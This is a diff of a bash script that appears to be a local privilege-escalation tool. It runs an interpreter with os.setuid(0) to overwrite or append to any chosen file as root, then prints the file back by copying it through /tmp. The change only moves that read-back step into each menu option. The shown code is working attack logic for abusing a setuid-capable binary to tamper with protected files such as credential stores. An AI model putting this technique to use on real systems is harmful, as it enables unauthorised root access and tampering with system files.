@@ -333,12 +333,24 @@ while true; do
                                         "Fully replace the file")
                                             read -p "What do you want to write into this file ? : " REPLACEFILE
                                             "$choice" -c 'import os; os.setuid(0);open("'$FILE'","w+").write("'$REPLACEFILE'")'
+
+                                            echo "contents of the file after modification : "
+                                            echo " "
+                            
+                                            "$choice" -c 'import os;os.setuid(0);os.system("cp '$FILE' /tmp/tempfile");print(open("/tmp/tempfile").read());os.system("rm /tmp/tempfile")'
+                                            
                                             break
                                             ;;
                             
                                         "Append data to the file")
                                             read -p "What do you want to append this file ? : " APPENDFILE
                                             "$choice" -c 'import os; os.setuid(0);open("'$FILE'","a").write("\n'$APPENDFILE'")'
+
+                                            echo "contents of the file after modification : "
+                                            echo " "
+                            
+                                            "$choice" -c 'import os;os.setuid(0);os.system("cp '$FILE' /tmp/tempfile");print(open("/tmp/tempfile").read());os.system("rm /tmp/tempfile")'
+                                            
                                             break
                                             ;;
                             
@@ -352,12 +364,7 @@ while true; do
                                     esac
                                 done
                             done
-
-                            echo "contents of the file after modification : "
-                            echo " "
                             
-                            "$choice" -c 'import os;os.setuid(0);os.system("cp '$FILE' /tmp/tempfile");print(open("/tmp/tempfile").read());os.system("rm /tmp/tempfile")'
-
                             read -p "Do you want to edit another file? [y/N] : " answer
 
                             if [[ "$answer" =~ ^[Yy]$ ]]; then
